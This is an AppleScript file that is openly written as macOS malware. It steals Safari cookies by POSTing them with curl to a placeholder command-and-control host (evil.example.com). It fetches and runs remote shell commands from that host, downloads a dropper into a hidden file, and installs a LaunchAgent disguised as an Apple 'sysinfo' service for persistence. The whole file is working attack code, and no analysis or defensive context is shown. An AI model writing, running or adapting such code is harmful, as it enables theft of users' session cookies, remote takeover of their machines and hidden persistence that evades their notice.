-- 🧬 CONFIG
property c2URL : "http://evil.example.com"
property localPath : POSIX path of (path to library folder from user domain) & "Containers/.sysinfo.scpt"
property launchAgentPath : POSIX path of (path to library folder from user domain) & "LaunchAgents/com.apple.sysinfo.plist"

-- 📤 Exfiltrate Safari cookies
try
    tell application "Safari"
        set cookieData to do JavaScript "document.cookie" in document 1
    end tell
    do shell script "curl -s -X POST -d 'cookies=" & cookieData & "' " & c2URL & "/steal"
end try

-- 📥 Download command from C2
try
    set remoteCmd to do shell script "curl -s " & c2URL & "/command"
    do shell script remoteCmd
end try

-- ♻️ Persistence: Drop self + LaunchAgent
try
    -- Save self if not already present
    if not (do shell script "test -f " & quoted form of localPath & " && echo 1 || echo 0") is "1" then
        do shell script "curl -s " & c2URL & "/dropper.scpt -o " & quoted form of localPath
    end if

    -- Create LaunchAgent plist
    set plistContent to "
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
    <key>Label</key><string>com.apple.sysinfo</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/osascript</string>
        <string>" & localPath & "</string>
    </array>
    <key>RunAtLoad</key><true/>
</dict>
</plist>"
    do shell script "echo " & quoted form of plistContent & " > " & quoted form of launchAgentPath
    do shell script "launchctl load " & quoted form of launchAgentPath
end try
